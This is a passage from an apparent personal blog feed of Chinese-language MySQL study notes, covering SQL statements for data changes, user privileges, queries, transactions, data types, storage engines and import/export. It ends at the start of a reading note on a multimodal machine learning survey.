这样做需要把每个字段的值都一一对应起来</span></span><br><span class="line"><span class="comment">-- 更新字段值</span></span><br><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 列<span class="number">1</span>=列值<span class="number">1</span>, 列<span class="number">2</span>=列值<span class="number">2</span>, ... <span class="keyword">WHERE</span> 条件; <span class="comment">-- 不加where条件会修改所有的记录</span></span><br><span class="line"><span class="comment">-- 删除字段值，同样不加where条件会删除所有的记录</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> 条件;</span><br><span class="line"><span class="comment">-- 删除整个表，这个是DDL的指令，好处是再次插入id从1开始。</span></span><br><span class="line"><span class="comment">-- 用delete则是从后面继续插入，前面的id不会再次使用</span></span><br><span class="line"><span class="keyword">TRUNCATE</span> 表名;</span><br></pre></td></tr></table></figure><h5 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 修改登录权限，数据库mysql中的表user</span></span><br><span class="line"><span class="comment">-- 表中字段Host代表可登陆ip</span></span><br><span class="line"><span class="comment">-- 登录默认 -h 是localhost/127.0.0.1。</span></span><br><span class="line"><span class="comment">-- 刷新权限</span></span><br><span class="line"><span class="keyword">flush</span> privilges;</span><br><span class="line"><span class="comment">-- 普通用户的创建</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">'用户名'</span>@<span class="string">'指定ip'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'用户名密码'</span>; <span class="comment">-- 指定ip处可输入%代表匹配所有ip（不安全）</span></span><br><span class="line"><span class="comment">-- 删除用户</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">'用户名'</span>@<span class="string">'指定ip'</span>;</span><br><span class="line"><span class="comment">-- 用户的授权，权限一般有 insert update delete select</span></span><br><span class="line"><span class="keyword">grant</span> 权限<span class="number">1</span>,权限<span class="number">2</span>,...on 数据库名.* <span class="keyword">to</span> <span class="string">'用户名'</span>@<span class="string">'ip地址或者%'</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">'用户名'</span>@<span class="string">'ip地址或者%'</span>;</span><br><span class="line"><span class="comment">-- 创建用户并授权</span></span><br><span class="line"><span class="keyword">grant</span> 权限<span class="number">1</span>,权限<span class="number">2</span>,...on 数据库名.* <span class="keyword">to</span> <span class="string">'用户名（新建）'</span>@<span class="string">'ip地址或者%'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'新密码'</span>;</span><br><span class="line"><span class="comment">-- 撤销权限</span></span><br><span class="line"><span class="keyword">revoke</span> 权限<span class="number">1</span>,权限<span class="number">2</span>,.. <span class="keyword">on</span> 数据库名.* <span class="keyword">from</span> <span class="string">'用户名'</span>@<span class="string">'ip地址或者%'</span>;</span><br><span class="line"><span class="comment">-- 查看权限</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">grants</span> <span class="keyword">for</span> <span class="string">'用户名'</span>@<span class="string">'IP地址'</span>(\G)</span><br><span class="line"><span class="comment">-- 删除用户</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span><span class="string">'用户名'</span>@<span class="string">'IP地址'</span></span><br></pre></td></tr></table></figure><h5 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- ###########################################################</span></span><br><span class="line"><span class="comment">-- ##################### 0. 常用关键字 ########################</span></span><br><span class="line"><span class="comment">-- ###########################################################</span></span><br><span class="line">WHERE 条件;</span><br><span class="line">AS 新的字段名;</span><br><span class="line">\G; <span class="comment">-- 更格式化的输出</span></span><br><span class="line">EXISTS <span class="comment">--假如子查询查询到记录，则进行外层查询，否则不执行外层查询</span></span><br><span class="line">ANY <span class="comment">--表示满足其中任一条件</span></span><br><span class="line">ALL <span class="comment">--表示满足所有条件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ###########################################################</span></span><br><span class="line"><span class="comment">-- ###################### 1. 普通查询 #########################</span></span><br><span class="line"><span class="comment">-- ###########################################################</span></span><br><span class="line"><span class="comment">-- SELECT 普通查询</span></span><br><span class="line"><span class="keyword">SELECT</span> 字段名<span class="number">1</span>,字段名<span class="number">2</span>,..... <span class="keyword">FROM</span> 表名;</span><br><span class="line"><span class="comment">-- DISTINCT 过滤掉重复的值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> 字段名<span class="number">1</span>,字段名<span class="number">2</span>,... <span class="keyword">FROM</span> 表名;</span><br><span class="line"><span class="comment">-- CONCAT 连接数个字段（无空格连接）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(字段名<span class="number">1</span>,字段名<span class="number">2</span>,...) <span class="keyword">FROM</span> 表名;</span><br><span class="line"><span class="comment">-- CONCAT_WS 连接数个字段并重新命名并加入分隔符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONCAT_WS</span>(<span class="string">'你定义的分隔符'</span>,字段名<span class="number">1</span>,字段名<span class="number">2</span>,.....) <span class="keyword">FROM</span> 表名;</span><br><span class="line"><span class="comment">-- 模糊查询（LIKE只适用于数据量很小的情况下，数据量大的话使用sphinx）</span></span><br><span class="line"><span class="keyword">SELECT</span> 字段名<span class="number">1</span>,字段名<span class="number">2</span>,..... <span class="keyword">FROM</span> 表名 字段名 <span class="keyword">LIKE</span> <span class="string">'%模糊条件%'</span>;</span><br><span class="line"><span class="comment">-- ORDER BY 排序</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 字段名 <span class="keyword">ASC</span>/<span class="keyword">DESC</span>; <span class="comment">-- 升序或降序</span></span><br><span class="line"><span class="comment">-- GROUP BY，分组查询，单独使用毫无意义</span></span><br><span class="line"><span class="comment">-- 与 GROUP_CONCAT 一起使用，GROUP_CONCAT里包含的字段，以默认逗号连接，以 GROUP BY 的字段为分类标准输出</span></span><br><span class="line"><span class="keyword">SELECT</span> mathpixtype,<span class="keyword">GROUP_CONCAT</span>(nickname) <span class="keyword">FROM</span> weixinuserinfo <span class="keyword">GROUP</span> <span class="keyword">BY</span> mathpixtype;</span><br><span class="line">+<span class="comment">--------------+-----------------------------------+</span></span><br><span class="line">| mathpixtype  | group_concat(nickname)            |</span><br><span class="line">+<span class="comment">--------------+-----------------------------------+</span></span><br><span class="line">| asciimath    | presume                           |</span><br><span class="line">| latex_styled | 王雅萱                            |</span><br><span class="line">| mathml       | 痒肉多,悦,城北徐公,Jasper,Suntion3 |</span><br><span class="line">| text         | 乐多,Law.D.Ares,李蕴斐Amber,Rookie |</span><br><span class="line">+<span class="comment">--------------+-----------------------------------+</span></span><br><span class="line"><span class="comment">-- 与聚合函数 COUNT 一起使用</span></span><br><span class="line"><span class="keyword">SELECT</span> mathpixtype,<span class="keyword">COUNT</span>(nickname) <span class="keyword">FROM</span> weixinuserinfo <span class="keyword">GROUP</span> <span class="keyword">BY</span> mathpixtype;</span><br><span class="line">+<span class="comment">--------------+-----------------+</span></span><br><span class="line">| mathpixtype  | count(nickname) |</span><br><span class="line">+<span class="comment">--------------+-----------------+</span></span><br><span class="line">| asciimath    |               1 |</span><br><span class="line">| latex_styled |               1 |</span><br><span class="line">| mathml       |              17 |</span><br><span class="line">| text         |               4 |</span><br><span class="line">+<span class="comment">--------------+-----------------+</span></span><br><span class="line"><span class="comment">-- 与 HAVING 一起使用，选取条件限制输出结果</span></span><br><span class="line"><span class="keyword">SELECT</span> mathpixtype,<span class="keyword">COUNT</span>(nickname) <span class="keyword">FROM</span> weixinuserinfo <span class="keyword">GROUP</span> <span class="keyword">BY</span> mathpixtype <span class="keyword">HAVING</span> <span class="keyword">COUNT</span>(nickname)&gt;<span class="number">3</span>;</span><br><span class="line">+<span class="comment">-------------+-----------------+</span></span><br><span class="line">| mathpixtype | count(nickname) |</span><br><span class="line">+<span class="comment">-------------+-----------------+</span></span><br><span class="line">| mathml      |              17 |</span><br><span class="line">| text        |               4 |</span><br><span class="line">+<span class="comment">-------------+-----------------+</span></span><br><span class="line"><span class="comment">-- 与 WITH ROLLUP 一起使用，最后加入一个总和行</span></span><br><span class="line"><span class="keyword">SELECT</span> mathpixtype,<span class="keyword">COUNT</span>(nickname) <span class="keyword">FROM</span> weixinuserinfo <span class="keyword">GROUP</span> <span class="keyword">BY</span> mathpixtype <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>;</span><br><span class="line">+<span class="comment">--------------+-----------------+</span></span><br><span class="line">| mathpixtype  | count(nickname) |</span><br><span class="line">+<span class="comment">--------------+-----------------+</span></span><br><span class="line">| asciimath    |               1 |</span><br><span class="line">| latex_styled |               1 |</span><br><span class="line">| mathml       |              17 |</span><br><span class="line">| text         |               4 |</span><br><span class="line">| NULL         |              23 |</span><br><span class="line">+<span class="comment">--------------+-----------------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ###########################################################</span></span><br><span class="line"><span class="comment">-- ###################### 2. 聚合函数 #########################</span></span><br><span class="line"><span class="comment">-- ###########################################################</span></span><br><span class="line"><span class="comment">-- 查询表的记录数，不适合数据量大的数据库，解决办法可以直接看id最后一条</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> 表名;</span><br><span class="line"><span class="comment">-- 查询此列的和</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">SUM</span>(字段名) <span class="keyword">FROM</span> 表名;</span><br><span class="line"><span class="comment">-- 查询此列的平均值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">AVG</span>(字段名) <span class="keyword">FROM</span> 表名;</span><br><span class="line"><span class="comment">-- 查询此列的最大值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MAX</span>(字段名) <span class="keyword">FROM</span> 表名;</span><br><span class="line"><span class="comment">-- 查询此列的最小值</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MIN</span>(字段名) <span class="keyword">FROM</span> 表名;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ###########################################################</span></span><br><span class="line"><span class="comment">-- ###################### 3. 连接查询 #########################</span></span><br><span class="line"><span class="comment">-- ###########################################################</span></span><br><span class="line"><span class="comment">-- 内连接查询</span></span><br><span class="line"><span class="keyword">SELECT</span> s.name,m.mark <span class="keyword">from</span> student <span class="keyword">as</span> s ,          mark <span class="keyword">as</span> m <span class="keyword">where</span>    s.id=m.stu_id;</span><br><span class="line"><span class="keyword">SELECT</span> s.name,m.mark <span class="keyword">from</span> student <span class="keyword">as</span> s <span class="keyword">inner</span> <span class="keyword">join</span> mark <span class="keyword">as</span> m <span class="keyword">where</span>/<span class="keyword">on</span> s.id=m.stu_id;</span><br><span class="line"><span class="comment">-- 左连接查询(先全列出左边的表，再以左边的表为基础，右边的表对应过去)</span></span><br><span class="line"><span class="keyword">SELECT</span> s.name,m.mark <span class="keyword">from</span> student <span class="keyword">as</span> s <span class="keyword">left</span> <span class="keyword">join</span> mark <span class="keyword">as</span> m <span class="keyword">on</span> s.id=m.stu_id;</span><br><span class="line"><span class="comment">-- 右连接查询</span></span><br><span class="line"><span class="keyword">SELECT</span> s.name,m.mark <span class="keyword">from</span> student <span class="keyword">as</span> s <span class="keyword">right</span> <span class="keyword">join</span> mark <span class="keyword">as</span> m <span class="keyword">on</span> s.id=m.stu_id;</span><br><span class="line"><span class="comment">-- 联合查询（字段数量一定要一致）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">from</span> student <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> mark <span class="keyword">from</span> mark;</span><br><span class="line"><span class="comment">-- 以下两句等价</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span>(<span class="number">2</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">SELECT</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">5</span>;</span><br><span class="line"><span class="comment">-- 子查询</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span>(<span class="keyword">select</span> stu_id <span class="keyword">from</span> mark);</span><br><span class="line"><span class="comment">-- 分页查询 LIMIT</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> student <span class="keyword">limit</span> <span class="number">3</span>; <span class="comment">-- 限制查询条数为3</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> student <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span>; <span class="comment">-- 取最大id</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> student <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">2</span>; <span class="comment">-- 限制查询条数为从第三个开始取两个</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 动态SQL中连接AND条件</span></span><br><span class="line">where 1=1 是为了避免where 关键字后面的第一个词直接就是 “and”而导致语法错误。</span><br></pre></td></tr></table></figure><h5 id="DTL-事务控制语言"><a href="#DTL-事务控制语言" class="headerlink" title="DTL 事务控制语言"></a>DTL 事务控制语言</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 关闭自动提交</span></span><br><span class="line"><span class="keyword">set</span> autocommit=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 开启事务</span></span><br><span class="line"><span class="keyword">START</span> <span class="keyword">TRANSACTION</span>;</span><br><span class="line"><span class="comment">-- 如果开启事务后所有语句执行都没有问题</span></span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="comment">-- 如果有执行失败的语句</span></span><br><span class="line"><span class="keyword">rollback</span>; <span class="comment">-- 记得set autocommit=0关闭自动提交</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql</title>
      <link href="/2019/03/02/Mysql/"/>
      <url>/2019/03/02/Mysql/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关系型数据库，开源</p></blockquote><h4 id="命令行基本操作"><a href="#命令行基本操作" class="headerlink" title="命令行基本操作"></a>命令行基本操作</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 登陆mysql</span></span><br><span class="line">$ mysql -h hostname -u username -p</span><br></pre></td></tr></table></figure><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><h5 id="整数型"><a href="#整数型" class="headerlink" title="整数型"></a>整数型</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">所有整数型默认是有符号数</span><br><span class="line">tinyint:   1字节</span><br><span class="line">smallint:  2字节</span><br><span class="line">mediumint: 3字节</span><br><span class="line">int:       4字节</span><br><span class="line">bigint:    8字节</span><br></pre></td></tr></table></figure><h5 id="小数型"><a href="#小数型" class="headerlink" title="小数型"></a>小数型</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">float(m,d):   单精度，4字节，非精确数，通常不设定长度</span><br><span class="line">double(m,d):  双精度，8字节，非精确数，通常不设定长度</span><br><span class="line">decimal(m,d): 定点数，精确数，设定长度</span><br><span class="line"><span class="comment">-- m是数字总位数，d是小数点后面的位数，若省略，则根据硬件允许的限制来保存值</span></span><br></pre></td></tr></table></figure><h5 id="字符串型"><a href="#字符串型" class="headerlink" title="字符串型"></a>字符串型</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char:     0-255字节，定长字符串，存取速度快</span><br><span class="line">varchar:  0-65535字节，变长字符串</span><br><span class="line">tinytext: 0-255字节，短文本数据</span><br><span class="line">text:     0-65535字节，文本数据</span><br><span class="line">mediumtext: 0-(2^24-1)字节，中等长文本数据</span><br><span class="line">longtext: 0-(2^32-1)字节，超长文本数据</span><br><span class="line"><span class="keyword">set</span>(<span class="string">'value1'</span>,<span class="string">'value2'</span>...): <span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>、<span class="number">4</span>或<span class="number">8</span>个字节，取决于成员数目（最多<span class="number">64</span>个成员）</span><br><span class="line">enum(<span class="string">'value1'</span>,<span class="string">'value2'</span>...): <span class="number">1</span>或<span class="number">2</span>个字节，取决于枚举值数目（最多<span class="number">65535</span>个值）</span><br></pre></td></tr></table></figure><h5 id="日期时间型"><a href="#日期时间型" class="headerlink" title="日期时间型"></a>日期时间型</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">year      1字节，YYYY</span><br><span class="line">timestamp 4字节，YYYYMMDD HHMMSS</span><br><span class="line">time      3字节，HH:MM:SS</span><br><span class="line">date      3字节，YYYY-MM-DD</span><br><span class="line">datetime  8字节，YYYY-MM-DD HH:MM:SS</span><br><span class="line"><span class="comment">-- 一般建议用int存储时间的 时间戳</span></span><br><span class="line"><span class="comment">-- 时间戳转换工具：http://tool.chinaz.com/Tools/unixtime.aspx</span></span><br></pre></td></tr></table></figure><h5 id="二进制类型"><a href="#二进制类型" class="headerlink" title="二进制类型"></a>二进制类型</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 一般用来存放图片视频等数据</span></span><br><span class="line">binary(m):    长度为0~m的定长二进制字符串</span><br><span class="line">varbinary(m): 长度为0~m的变长二进制字符串</span><br><span class="line">bit(m):       m位二进制数据，最多255个字节</span><br><span class="line">tinyblob:     可变长二进制数据，最多255个字节</span><br><span class="line">blob:         可变长二进制数据，最多(2^16-1)个字节</span><br><span class="line">mediumblob:   可变长二进制数据，最多(2^24-1)个字节</span><br><span class="line">longblob:     可变长二进制数据，最多(2^32-1)个字节</span><br></pre></td></tr></table></figure><h4 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h4><p>最常用的数据库存储引擎：</p><ol><li>MyISAM全文索引（full text），不支持事务，表级锁，崩溃恢复支持不好</li><li>InnoDB（5.6开始默认的数据库引擎），支持事务，不支持全文索引，5.6版本后开始支持，行级锁，数据量大的时候性能更好。推荐使用InnoDB，速度快。</li><li>BLACKHOLE</li><li>CSV</li><li>MEMORY</li><li>ARCHIVE<h5 id="数据库表引擎操作"><a href="#数据库表引擎操作" class="headerlink" title="数据库表引擎操作"></a>数据库表引擎操作</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建表时设定引擎</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(字段名 字段类型...) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span>;</span><br><span class="line"><span class="comment">-- 修改表引擎</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">engine</span>=目标引擎;</span><br><span class="line"><span class="comment">-- 查看数据表的引擎和所有信息</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">table</span> <span class="keyword">status</span>\G;</span><br></pre></td></tr></table></figure><h4 id="字符集编码"><a href="#字符集编码" class="headerlink" title="字符集编码"></a>字符集编码</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看数据库字符集</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">database</span> 数据库名;</span><br><span class="line"><span class="comment">-- 创建数据库时设置字符规则</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> 数据库名 <span class="built_in">character</span> <span class="keyword">set</span> gbk;</span><br><span class="line"><span class="comment">-- 创建表时设置字符规则</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(字段名 字段属性...) <span class="keyword">charset</span>=gbk;</span><br><span class="line"><span class="comment">-- 修改表字符规则</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">charset</span>=utf8;</span><br><span class="line"><span class="comment">-- 字符集校对</span></span><br><span class="line"><span class="comment">-- 校对规则是定义了比较字符串的方式，解决排序和字符分组的问题</span></span><br><span class="line"><span class="comment">-- 使用 utf8_general_ci 不区分大小写</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(字段名 字段属性...) <span class="keyword">collate</span>=utf8_general_ci;</span><br></pre></td></tr></table></figure><h4 id="字节字符长度"><a href="#字节字符长度" class="headerlink" title="字节字符长度"></a>字节字符长度</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- gbk：2字节</span></span><br><span class="line"><span class="comment">-- utf8：3字节</span></span><br><span class="line"><span class="comment">-- 英文：1字节 为 1字符</span></span><br><span class="line"><span class="comment">-- 汉字：2字节 为 1字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- int(n)中的n只有在zerofill的情况下才有用，否则存储数据不受n的位数限制</span></span><br><span class="line"><span class="comment">-- char(n)中的n为字符长度，上限255个字母或汉字。</span></span><br><span class="line"><span class="comment">-- varchar(n)同char。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 三种长度模式：</span></span><br><span class="line"><span class="keyword">set</span> sql_mode =  * ; <span class="comment">-- 默认是宽松模式</span></span><br><span class="line"><span class="comment">-- ANSI 宽松模式 （数据格式不对时warning）</span></span><br><span class="line"><span class="comment">-- STRICT_TRANS_TABLES （数据格式不对时直接error）</span></span><br><span class="line"><span class="comment">-- TRADITIONAL （对所有的事务存储引擎，非事物存储引擎检查：</span></span><br><span class="line"><span class="comment">-- 日期类型中的月和日部分不能包含0，不能有0这样的日期0000-00-00，</span></span><br><span class="line"><span class="comment">-- 数据不能除0，进制grant自动创建新用户等一些校验）</span></span><br></pre></td></tr></table></figure><h4 id="数据导入导出"><a href="#数据导入导出" class="headerlink" title="数据导入导出"></a>数据导入导出</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 导出</span></span><br><span class="line">mysqld -u用户名 -p密码 数据库名 表名 &gt;保存文件名.sql</span><br><span class="line"><span class="comment">-- 导入</span></span><br><span class="line">mysql -u用户名 -p密码 数据库名 &lt; 要导入的文件名.sql</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReadingNote——MMML</title>
      <link href="/2019/02/05/ReadingNote%E2%80%94%E2%80%94MMML/"/>
      <url>/2019/02/05/ReadingNote%E2%80%94%E2%80%94MMML/</url>
      
        <content type="html"><![CDATA[<h2 id="ReadingNote——Multimodal-Machine-Learning-A-Survey-and-Taxonomy"><a href="#ReadingNote——Multimodal-Machine-Learning-A-Survey-and-Taxonomy" class="headerlink" title="ReadingNote——Multimodal Machine Learning : A Survey and Taxonomy"></a>ReadingNote——Multimodal Machine Learning : A Survey and Taxonomy</h2><blockquote><p>Multimodal machine learning aims to build models that can process and relate information from multiple modalities.<br>多模态机器学习旨在：建立能够处理和关联来自多个模态的信息的模型。</p></blockquote><p>Three main modalities: natural languages; visual signals; vocal signals</p><h3 id="Challenges"><a href="#Challenges" class="headerlink" 